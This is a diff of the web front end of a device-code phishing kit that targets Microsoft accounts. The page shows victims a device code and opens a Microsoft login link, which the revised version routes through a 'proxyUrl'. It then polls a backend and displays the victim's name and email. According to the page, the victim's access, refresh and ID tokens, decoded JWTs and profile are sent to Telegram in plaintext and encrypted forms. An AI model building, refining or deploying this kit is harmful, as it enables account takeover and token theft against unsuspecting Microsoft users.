@@ -3,16 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Device Auth - Token Capture</title>
+  <title>Token Capture</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      font-family: 'Segoe UI', system-ui, sans-serif;
       background: linear-gradient(135deg, #0078d4 0%, #00bcf2 100%);
       min-height: 100vh;
       display: flex;
@@ -20,31 +15,26 @@
       justify-content: center;
       padding: 20px;
     }
-
     .container {
       background: white;
       border-radius: 24px;
       padding: 50px 40px;
       max-width: 600px;
       width: 100%;
-      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 25px 70px rgba(0,0,0,0.3);
       text-align: center;
     }
-
     h1 {
       color: #0078d4;
       font-size: 36px;
       margin-bottom: 15px;
       font-weight: 700;
     }
-
     .subtitle {
       color: #666;
       font-size: 16px;
       margin-bottom: 40px;
-      line-height: 1.6;
     }
-
     .btn {
       background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
       color: white;
@@ -58,37 +48,27 @@
       transition: all 0.3s;
       text-transform: uppercase;
       letter-spacing: 1.2px;
-      box-shadow: 0 10px 25px rgba(0, 120, 212, 0.35);
+      box-shadow: 0 10px 25px rgba(0,120,212,0.35);
     }
-
     .btn:hover:not(:disabled) {
       transform: translateY(-4px);
-      box-shadow: 0 15px 35px rgba(0, 120, 212, 0.45);
+      box-shadow: 0 15px 35px rgba(0,120,212,0.45);
     }
-
-    .btn:active:not(:disabled) {
-      transform: translateY(-2px);
-    }
-
     .btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
     }
-
     .code-section {
       display: none;
       margin-top: 50px;
     }
-
     .code-box {
       background: linear-gradient(135deg, #fff9c4 0%, #fff59d 100%);
       border: 4px solid #ff9800;
       border-radius: 20px;
       padding: 45px;
       margin-bottom: 30px;
-      position: relative;
     }
-
     .code-label {
       color: #e65100;
       font-size: 14px;
@@ -97,64 +77,42 @@
       margin-bottom: 20px;
       letter-spacing: 2px;
     }
-
     .code {
-      font-size: 80px;
+      font-size: 72px;
       font-weight: 900;
       color: #ff6b00;
-      letter-spacing: 20px;
+      letter-spacing: 18px;
       font-family: 'Courier New', monospace;
       margin: 25px 0;
       cursor: pointer;
       user-select: all;
       transition: all 0.3s;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
     }
-
     .code:hover {
-      transform: scale(1.08);
-      text-shadow: 0 0 25px rgba(255, 107, 0, 0.4);
+      transform: scale(1.05);
     }
-
-    .code-hint {
-      color: #e65100;
-      font-size: 13px;
-      margin-top: 15px;
-      font-weight: 600;
-    }
-
     .countdown {
-      font-size: 28px;
+      font-size: 24px;
       color: #ff6b00;
       font-weight: 700;
       margin-top: 20px;
       padding: 15px;
-      background: rgba(255, 255, 255, 0.5);
+      background: rgba(255,255,255,0.5);
       border-radius: 10px;
     }
-
     .countdown.expiring {
       color: #d32f2f;
       animation: pulse 1s infinite;
     }
-
     @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.7; transform: scale(1.05); }
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
     }
-
     .auth-btn {
       background: linear-gradient(135deg, #ff6b00 0%, #e65100 100%);
       margin-top: 25px;
-      box-shadow: 0 10px 25px rgba(255, 107, 0, 0.35);
-      font-size: 19px;
-      padding: 24px 50px;
+      box-shadow: 0 10px 25px rgba(255,107,0,0.35);
     }
-
-    .auth-btn:hover:not(:disabled) {
-      box-shadow: 0 15px 35px rgba(255, 107, 0, 0.45);
-    }
-
     .spinner {
       border: 6px solid #f3f3f3;
       border-top: 6px solid #0078d4;
@@ -164,12 +122,10 @@
       animation: spin 1s linear infinite;
       margin: 35px auto;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     .status {
       margin-top: 35px;
       padding: 25px;
@@ -177,19 +133,16 @@
       font-weight: 700;
       font-size: 17px;
     }
-
     .status-pending {
       background: #fff3cd;
       color: #856404;
       border: 3px solid #ffc107;
     }
-
     .status-success {
       background: #d4edda;
       color: #155724;
       border: 3px solid #28a745;
     }
-
     .success-section {
       display: none;
       margin-top: 50px;
@@ -198,13 +151,11 @@
       border-radius: 20px;
       padding: 40px;
     }
-
     .success-section h2 {
       color: #2e7d32;
       font-size: 32px;
       margin-bottom: 30px;
     }
-
     .user-info {
       background: white;
       padding: 18px;
@@ -213,231 +164,158 @@
       border-left: 6px solid #4caf50;
       text-align: left;
     }
-
     .user-info strong {
       color: #2e7d32;
       display: block;
       font-size: 12px;
       margin-bottom: 8px;
       text-transform: uppercase;
-      letter-spacing: 1px;
     }
-
     .user-info span {
       color: #333;
       font-size: 17px;
-      word-break: break-all;
     }
-
-    .telegram-badge {
-      display: inline-block;
-      background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
-      color: white;
-      padding: 12px 25px;
-      border-radius: 25px;
-      font-weight: 700;
-      margin-top: 25px;
-      font-size: 15px;
-      box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
-    }
-
-    .capture-info {
-      background: rgba(255, 255, 255, 0.9);
+    .info-box {
+      background: rgba(255,255,255,0.9);
       padding: 20px;
       border-radius: 12px;
       margin-top: 25px;
       border-left: 5px solid #2e7d32;
       text-align: left;
     }
-
-    .capture-info h3 {
+    .info-box h3 {
       color: #2e7d32;
       margin-bottom: 15px;
       font-size: 18px;
     }
-
-    .capture-info ul {
+    .info-box ul {
       list-style: none;
       padding: 0;
     }
-
-    .capture-info li {
-      padding: 8px 0;
+    .info-box li {
+      padding: 6px 0;
       color: #333;
       font-size: 14px;
     }
-
-    .capture-info li::before {
+    .info-box li::before {
       content: '✓ ';
       color: #4caf50;
       font-weight: 900;
       margin-right: 8px;
     }
-
     @media (max-width: 600px) {
-      .container {
-        padding: 35px 25px;
-      }
-
-      .code {
-        font-size: 56px;
-        letter-spacing: 12px;
-      }
-
-      h1 {
-        font-size: 28px;
-      }
-
-      .auth-btn, .btn {
-        padding: 18px 30px;
-        font-size: 16px;
-      }
+      .container { padding: 35px 25px; }
+      .code { font-size: 56px; letter-spacing: 12px; }
+      h1 { font-size: 28px; }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🔐 Microsoft Device Authentication</h1>
-    <p class="subtitle">
-      Advanced Token Capture System<br>
-      Captures Access, Refresh, and ID Tokens
-    </p>
+    <h1>🔐 Microsoft Authentication</h1>
+    <p class="subtitle">Token Capture System</p>
 
-    <button class="btn" id="generateBtn" onclick="generateCode()">
-      🚀 Generate Authentication Code
+    <button class="btn" id="generateBtn" onclick="generate()">
+      Generate Code
     </button>
 
-    <!-- Code Display Section -->
     <div class="code-section" id="codeSection">
       <div class="code-box">
-        <div class="code-label">⚡ Your Device Code</div>
-        <div class="code" id="deviceCode" onclick="copyCode()">---</div>
-        <div class="code-hint">👆 Click to copy code</div>
-        <div class="countdown" id="countdown">Expires in: --:--</div>
+        <div class="code-label">Device Code</div>
+        <div class="code" id="deviceCode" onclick="copy()">---</div>
+        <div class="countdown" id="countdown">--:--</div>
       </div>
 
-      <button class="btn auth-btn" id="authBtn" onclick="openAuthPage()">
-        🌐 Open Microsoft Authentication Page
+      <button class="btn auth-btn" onclick="authenticate()">
+        Open Microsoft Login
       </button>
 
       <div class="spinner" id="spinner"></div>
-
       <div class="status status-pending" id="status">
-        ⏳ Waiting for you to authenticate on Microsoft...
+        Waiting for authentication...
       </div>
     </div>
 
-    <!-- Success Section -->
     <div class="success-section" id="successSection">
-      <h2>✅ Tokens Captured Successfully!</h2>
+      <h2>✅ Tokens Captured</h2>
       
       <div class="user-info">
-        <strong>👤 Name</strong>
+        <strong>Name</strong>
         <span id="userName">---</span>
       </div>
 
       <div class="user-info">
-        <strong>📧 Email</strong>
+        <strong>Email</strong>
         <span id="userEmail">---</span>
       </div>
 
-      <div class="capture-info">
-        <h3>📱 Sent to Telegram (12-13 Messages):</h3>
+      <div class="info-box">
+        <h3>📱 Sent to Telegram</h3>
         <ul>
-          <li>Access Token (Unencrypted Plaintext)</li>
-          <li>Access Token (AES-256-GCM Encrypted)</li>
-          <li>Refresh Token (Unencrypted Plaintext)</li>
-          <li>Refresh Token (AES-256-GCM Encrypted)</li>
-          <li>ID Token (Unencrypted Plaintext)</li>
-          <li>ID Token (AES-256-GCM Encrypted)</li>
-          <li>Decoded JWT (Header + Payload)</li>
-          <li>Token Claims & Permissions</li>
-          <li>Complete User Profile</li>
-          <li>Token Usage Guide</li>
-          <li>Complete Summary</li>
+          <li>Access Token (Plaintext)</li>
+          <li>Access Token (Encrypted)</li>
+          <li>Refresh Token (Plaintext)</li>
+          <li>Refresh Token (Encrypted)</li>
+          <li>ID Token (Both Forms)</li>
+          <li>JWT Decoded</li>
+          <li>User Profile</li>
+          <li>Usage Guide</li>
         </ul>
-      </div>
-
-      <div style="text-align: center;">
-        <div class="telegram-badge">
-          📱 Check Your Telegram Now!
-        </div>
       </div>
     </div>
   </div>
 
   <script>
-    let session = {
+    let state = {
       sessionId: null,
       userCode: null,
-      verificationUri: null,
-      verificationUriComplete: null,
+      proxyUrl: null,
       expiresAt: null,
       interval: 5,
-      pollInterval: null,
-      countdownInterval: null,
+      pollTimer: null,
+      countdownTimer: null,
     };
 
-    async function generateCode() {
+    async function generate() {
       try {
-        console.log('[FRONTEND] Generating device code...');
-        
         document.getElementById('generateBtn').disabled = true;
         document.getElementById('codeSection').style.display = 'block';
         document.getElementById('successSection').style.display = 'none';
 
-        const response = await fetch('/api/device/generate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' }
-        });
+        const res = await fetch('/api/device/generate', { method: 'POST' });
+        const data = await res.json();
 
-        if (!response.ok) {
-          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-        }
+        state.sessionId = data.sessionId;
+        state.userCode = data.userCode;
+        state.proxyUrl = data.proxyUrl;
+        state.expiresAt = new Date(Date.now() + data.expiresIn * 1000);
+        state.interval = data.interval;
 
-        const data = await response.json();
-        console.log('[FRONTEND] Device code generated:', data);
-
-        session.sessionId = data.sessionId;
-        session.userCode = data.userCode;
-        session.verificationUri = data.verificationUri;
-        session.verificationUriComplete = data.verificationUriComplete;
-        session.expiresAt = new Date(Date.now() + data.expiresIn * 1000);
-        session.interval = data.interval;
-
-        // Display code
         document.getElementById('deviceCode').textContent = data.userCode;
 
-        console.log('[FRONTEND] Verification URI:', session.verificationUriComplete);
-
-        // Start countdown
         startCountdown();
-
-        // Start polling
         startPolling();
 
-      } catch (error) {
-        console.error('[FRONTEND] Error:', error);
-        alert('Error generating code: ' + error.message);
+      } catch (err) {
+        console.error(err);
         document.getElementById('generateBtn').disabled = false;
       }
     }
 
     function startCountdown() {
-      session.countdownInterval = setInterval(() => {
-        const remaining = Math.floor((session.expiresAt - Date.now()) / 1000);
+      state.countdownTimer = setInterval(() => {
+        const remaining = Math.floor((state.expiresAt - Date.now()) / 1000);
         
         if (remaining <= 0) {
-          clearInterval(session.countdownInterval);
-          document.getElementById('countdown').textContent = '❌ EXPIRED';
+          clearInterval(state.countdownTimer);
+          document.getElementById('countdown').textContent = 'EXPIRED';
           document.getElementById('countdown').classList.add('expiring');
-          document.getElementById('status').textContent = '❌ Code expired. Please generate a new code.';
+          document.getElementById('status').textContent = 'Code expired';
           document.getElementById('spinner').style.display = 'none';
         } else {
-          const mins = Math.floor(remaining / 60);
-          const secs = remaining % 60;
-          const countdownText = 'Expires in: ' + mins + ':' + (secs < 10 ? '0' : '') + secs;
-          document.getElementById('countdown').textContent = countdownText;
+          const m = Math.floor(remaining / 60);
+          const s = remaining % 60;
+          document.getElementById('countdown').textContent = m + ':' + (s < 10 ? '0' : '') + s;
           
           if (remaining < 120) {
             document.getElementById('countdown').classList.add('expiring');
@@ -447,67 +325,44 @@
     }
 
     function startPolling() {
-      console.log('[FRONTEND] Starting to poll for authentication...');
-      
-      session.pollInterval = setInterval(async () => {
+      state.pollTimer = setInterval(async () => {
         try {
-          const response = await fetch('/api/device/poll/' + session.sessionId);
-          const data = await response.json();
-
-          console.log('[FRONTEND] Poll response:', data.status);
+          const res = await fetch('/api/device/poll/' + state.sessionId);
+          const data = await res.json();
 
           if (data.status === 'authenticated') {
-            clearInterval(session.pollInterval);
-            clearInterval(session.countdownInterval);
+            clearInterval(state.pollTimer);
+            clearInterval(state.countdownTimer);
             
-            console.log('[FRONTEND] Authentication successful!');
-            
-            // Hide spinner
             document.getElementById('spinner').style.display = 'none';
-            
-            // Update status
             document.getElementById('status').className = 'status status-success';
-            document.getElementById('status').textContent = '✅ Authentication complete! All tokens sent to Telegram!';
+            document.getElementById('status').textContent = '✅ Complete! Check Telegram';
 
-            // Show success
             document.getElementById('userName').textContent = data.user.displayName;
             document.getElementById('userEmail').textContent = data.user.email;
             document.getElementById('successSection').style.display = 'block';
 
-            // Show notification
-            if (data.message) {
-              console.log('[FRONTEND] Server message:', data.message);
-            }
-
           } else if (data.status === 'expired' || data.status === 'declined') {
-            clearInterval(session.pollInterval);
-            clearInterval(session.countdownInterval);
+            clearInterval(state.pollTimer);
+            clearInterval(state.countdownTimer);
             document.getElementById('spinner').style.display = 'none';
-            document.getElementById('status').className = 'status status-success';
-            document.getElementById('status').textContent = '❌ Authentication ' + data.status;
+            document.getElementById('status').textContent = data.status;
           }
-        } catch (error) {
-          console.error('[FRONTEND] Poll error:', error);
+        } catch (err) {
+          console.error(err);
         }
-      }, session.interval * 1000);
+      }, state.interval * 1000);
     }
 
-    function copyCode() {
-      if (session.userCode) {
-        navigator.clipboard.writeText(session.userCode);
-        alert('✅ Code copied to clipboard: ' + session.userCode);
+    function copy() {
+      if (state.userCode) {
+        navigator.clipboard.writeText(state.userCode);
       }
     }
 
-    function openAuthPage() {
-      console.log('[FRONTEND] Opening Microsoft auth page:', session.verificationUriComplete);
-      
-      if (session.verificationUriComplete) {
-        // Open the Microsoft device login page with the code pre-filled
-        window.open(session.verificationUriComplete, '_blank');
-        console.log('[FRONTEND] Opened:', session.verificationUriComplete);
-      } else {
-        alert('Please generate a code first!');
+    function authenticate() {
+      if (state.proxyUrl) {
+        window.open(state.proxyUrl, '_blank');
       }
     }
   </script>
